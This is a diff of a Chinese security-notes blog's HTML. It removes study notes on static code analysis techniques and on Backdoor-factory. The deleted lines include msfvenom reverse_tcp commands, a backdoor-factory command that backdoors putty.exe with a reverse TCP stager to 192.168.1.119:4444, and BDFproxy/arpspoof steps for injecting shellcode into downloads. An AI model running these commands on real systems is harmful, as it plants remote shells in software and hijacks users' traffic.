@@ -360,9 +360,7 @@
     </header>
     <main class="post-main" itemprop="articleBody">
       
-      <a id="more"></a>
-
-<h3 id="静态代码分析"><a href="#静态代码分析" class="headerlink" title="静态代码分析"></a>静态代码分析</h3><ul>
+      <h3 id="静态代码分析"><a href="#静态代码分析" class="headerlink" title="静态代码分析"></a>静态代码分析</h3><ul>
 <li>软件源代码的主要安全检测技术</li>
 <li>不需要构建代码运行环境，分析效率高，资源消耗低</li>
 </ul>
@@ -370,51 +368,7 @@
 <li>基于文本或标识符的匹配分析对比，以查找符合特定特征和词法规则的危险函数，API或简单语句组合。</li>
 <li>工具：Checkmarx、ITS4</li>
 </ul>
-<h5 id="数据流分析"><a href="#数据流分析" class="headerlink" title="数据流分析"></a>数据流分析</h5><ul>
-<li>分析软件代码中变量的取值变化和语句执行情况，来分析数据处理逻辑和程序的流控制关系，从而分析软件代码的潜在安全缺陷。</li>
-<li>适合检查因控制流信息非法传播导致的安全问题，比如内存访问越界，常数传播等。</li>
-<li>对于逻辑复杂的软件代码，其数据流复杂，检测准确率较低，误报率较高。</li>
-</ul>
-<h5 id="污点传播"><a href="#污点传播" class="headerlink" title="污点传播"></a>污点传播</h5><ul>
-<li>分析代码中输入数据对程序执行的影响，以发现不可信的输入数据导致的程序异常执行。</li>
-<li>需要标记要分析的输入数据</li>
-<li>具有较高的分析准确率，然而针对大规模代码分析，由于路径数量较多，因此其分析的性能会受到较大的影响。</li>
-<li>工具：Pixy</li>
-</ul>
-<h5 id="符号执行"><a href="#符号执行" class="headerlink" title="符号执行"></a>符号执行</h5><ul>
-<li>在不执行程序的前提下，将程序的输入表示为符号，根据程序的执行流程和输入参数的赋值变化，把程序的输出表示成包含这些符号的逻辑或算式表达式的一种技术。通过符号执行技术获得了程序输入和输出之间关系的算数表达式，可通过约束求解的方法获得能得出正常输出结果得到输入值的范围。不能得到正常输入出的输入值，或者输入值范围的安全边界点，则是处罚程序输出异常结果的潜在输入点，也是进行安全监测的重要检测区域。</li>
-<li>代价小、效率高。但存在路径爆炸的问题。</li>
-</ul>
-<h5 id="模型检验"><a href="#模型检验" class="headerlink" title="模型检验"></a>模型检验</h5><ul>
-<li>模型检验技术首先将软件构造为状态机或者有向图等抽象模型，并使用模态、时序逻辑公式等形式化的表达来描述安全属性，然后对模型进行遍历以验证软件的这些安全属性是否满足。</li>
-<li>可以实现全自动化，但存在状态空间爆炸的问题。</li>
-</ul>
-<h5 id="定理证明"><a href="#定理证明" class="headerlink" title="定理证明"></a>定理证明</h5><ul>
-<li>是将待验证问题转化为数学上的定理证明问题，从而判断程序是否满足特定安全属性。</li>
-<li>准确率最高，误报率较低。需要人工干预，自动化程度不高。难以用于新漏洞检测和大型程序分析。</li>
-<li>工具：Saturn、ESC/Java</li>
-</ul>
-<h4 id="可执行代码检测"><a href="#可执行代码检测" class="headerlink" title="可执行代码检测"></a>可执行代码检测</h4><ul>
-<li>对可执行代码进行反汇编后检测</li>
-<li>分析效率低下，误报率高</li>
-<li>分为基于程序结构的安全检测和基于程序语义的安全检测技术</li>
-</ul>
-<h5 id="程序结构"><a href="#程序结构" class="headerlink" title="程序结构"></a>程序结构</h5><ul>
-<li>从二进制文件的头部，符号表以及调试信息中提取安全敏感信息</li>
-<li>IDA Pro、Bugscam</li>
-</ul>
-<h5 id="程序语义"><a href="#程序语义" class="headerlink" title="程序语义"></a>程序语义</h5><ul>
-<li>首先反汇编得到汇编代码，再将汇编代码转换为中间语言，在分析中间语言的基础上针对得到的部分语义信息进行缺陷和漏洞检测。</li>
-<li>目前使用最为广泛的两种中间语言是二进制插桩平台Binnavi中使用的REIL，和动态插桩平台Valgrind中使用的VEX</li>
-<li>跨平台</li>
-<li>逆向分析的三个步骤<ul>
-<li>（先逆向，比如用IDA）找到操作栈的关键函数，比如memcpy、strcpy等</li>
-<li>判断栈与操作参数的大小关系，以定位是否发生了溢出漏洞</li>
-<li>回溯函数的参数</li>
-</ul>
-</li>
-</ul>
-<h5 id="程序语义-1"><a href="#程序语义-1" class="headerlink" title="程序语义"></a>程序语义</h5><h4 id="动态安全检测"><a href="#动态安全检测" class="headerlink" title="动态安全检测"></a>动态安全检测</h4>
+<h5 id="数据流分析"><a href="#数据流分析" class="headerlink" title="数据流分析"></a>数据流分析</h5>
       
     </main>
     <footer class="post-footer">
@@ -852,9 +806,7 @@
     </header>
     <main class="post-main" itemprop="articleBody">
       
-      <a id="more"></a>
-
-<h4 id="Backdoor-factory"><a href="#Backdoor-factory" class="headerlink" title="Backdoor-factory"></a>Backdoor-factory</h4><ul>
+      <h4 id="Backdoor-factory"><a href="#Backdoor-factory" class="headerlink" title="Backdoor-factory"></a>Backdoor-factory</h4><ul>
 <li>Patch<ul>
 <li>通过替换exe、dll、注册表等方法修复系统漏洞或问题的方法</li>
 <li>BDF：向二进制文件中增加或者删除代码内容<ul>
@@ -870,79 +822,6 @@
 </ul>
 </li>
 </ul>
-<h5 id="msf使用的patch方法（BDF也支持）"><a href="#msf使用的patch方法（BDF也支持）" class="headerlink" title="msf使用的patch方法（BDF也支持）"></a>msf使用的patch方法（BDF也支持）</h5><ul>
-<li>覆盖程序入口<ul>
-<li><code>msfvenom -p windows/shell/reverse_tcp</code></li>
-</ul>
-</li>
-<li>创建新的线程执行shellcode并跳回原程序入口<ul>
-<li><code>msfvenom -p windows/shell/reverse_tcp -k</code></li>
-<li>增加代码片段，跳转执行后跳回源程序入口</li>
-</ul>
-</li>
-</ul>
-<h5 id="CTP方法"><a href="#CTP方法" class="headerlink" title="CTP方法"></a>CTP方法</h5><ul>
-<li><p>增加新的代码段section,与MSF的-k方法类似</p>
-</li>
-<li><p>使用现有的代码缝隙（code cave）存放shellcode</p>
-</li>
-<li><p>Codecave</p>
-<ul>
-<li>二进制文件中超过两个字节的连续x00区域（代码片段间区域）</li>
-<li>根据统计判断，代码缝隙是在编译器在进行编译时造成的，不同的编译器产生的代码缝隙大小不同。</li>
-</ul>
-</li>
-<li><p>单个代码缝隙不足以存放完整shellcode时</p>
-<ul>
-<li>多codecave跳转</li>
-<li>结合msf的stager方法</li>
-</ul>
-</li>
-<li><p>patch选项</p>
-<ul>
-<li>附加代码段</li>
-<li>单codecave注入</li>
-<li>多codecave注入</li>
-</ul>
-</li>
-</ul>
-<hr>
-<h4 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h4><ul>
-<li><p>查看是否支持<code>backdoor-factory -f putty.exe -S</code></p>
-</li>
-<li><p>查看代码缝隙<code>backdoor-factory -f putty.exe -c -l 100</code> </p>
-</li>
-<li><p>查看payload<code>backdoor-factory -f putty.exe -s show</code></p>
-</li>
-<li><p><code>backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_thread -H 192.168.1.119 -P 4444</code></p>
-</li>
-</ul>
-<hr>
-<h4 id="BDFproxy-通过mitmproxy实现"><a href="#BDFproxy-通过mitmproxy实现" class="headerlink" title="BDFproxy(通过mitmproxy实现)"></a>BDFproxy(通过mitmproxy实现)</h4><ul>
-<li>基于流量劫持，动态注入shellcode（ARP spoof、DNS spoof、fake AP）</li>
-<li>注入shellcode到下载文件的流量中</li>
-<li>会自动清楚PE的签名，用0覆盖</li>
-</ul>
-<h5 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h5><ul>
-<li><p><code>sysctl -w net.ipv4.ip_forward=1</code></p>
-</li>
-<li><p><code>iptables -t nat -A PREROUTING -p tcp --dport 80/443 -j REDIRECT -- to-ports 8080</code></p>
-</li>
-<li><p><code>vi /etc/bdfproxy/bdfproxy.cfg</code></p>
-<ul>
-<li>proxyMode=transparent</li>
-<li>修改侦听IP地址并启动bdfproxy</li>
-</ul>
-</li>
-<li><p>arpspoof -i eth0 -t 1.1.1.2 1.1.1.1</p>
-</li>
-<li><p>启动MSF</p>
-</li>
-</ul>
-<h4 id="Mana"><a href="#Mana" class="headerlink" title="Mana"></a>Mana</h4><ul>
-<li>无线Ap</li>
-</ul>
-
       
     </main>
     <footer class="post-footer">
